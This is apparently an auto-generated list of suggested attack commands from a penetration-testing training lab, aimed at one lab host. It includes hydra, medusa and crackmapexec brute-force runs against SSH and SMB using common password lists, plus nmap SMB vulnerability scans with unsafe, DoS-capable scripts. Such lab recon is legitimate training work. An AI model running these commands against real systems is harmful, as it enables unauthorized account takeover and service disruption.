```bash
[*] ssh on tcp/22

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/home/chris/trainings/pwk/workspace/labs/susie/10.11.1.146/scans/tcp22/tcp_22_ssh_hydra.txt" ssh://10.11.1.146

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/home/chris/trainings/pwk/workspace/labs/susie/10.11.1.146/scans/tcp22/tcp_22_ssh_medusa.txt" -M ssh -h 10.11.1.146

[*] netbios-ssn on tcp/139

	[-] Bruteforce SMB

		crackmapexec smb 10.11.1.146 --port=139 -u "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -p "/usr/share/seclists/Passwords/darkweb2017-top100.txt"

	[-] Nmap scans for SMB vulnerabilities that could potentially cause a DoS if scanned (according to Nmap). Be careful:

		nmap -vv --reason -Pn -T4 -sV -p 139 --script="smb-vuln-* and dos" --script-args="unsafe=1" -oN "/home/chris/trainings/pwk/workspace/labs/susie/10.11.1.146/scans/tcp139/tcp_139_smb_vulnerabilities.txt" -oX "/home/chris/trainings/pwk/workspace/labs/susie/10.11.1.146/scans/tcp139/xml/tcp_139_smb_vulnerabilities.xml" 10.11.1.146

[*] netbios-ssn on tcp/445

	[-] Bruteforce SMB

		crackmapexec smb 10.11.1.146 --port=445 -u "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -p "/usr/share/seclists/Passwords/darkweb2017-top100.txt"

	[-] Nmap scans for SMB vulnerabilities that could potentially cause a DoS if scanned (according to Nmap). Be careful:

		nmap -vv --reason -Pn -T4 -sV -p 445 --script="smb-vuln-* and dos" --script-args="unsafe=1" -oN "/home/chris/trainings/pwk/workspace/labs/susie/10.11.1.146/scans/tcp445/tcp_445_smb_vulnerabilities.txt" -oX "/home/chris/trainings/pwk/workspace/labs/susie/10.11.1.146/scans/tcp445/xml/tcp_445_smb_vulnerabilities.xml" 10.11.1.146


```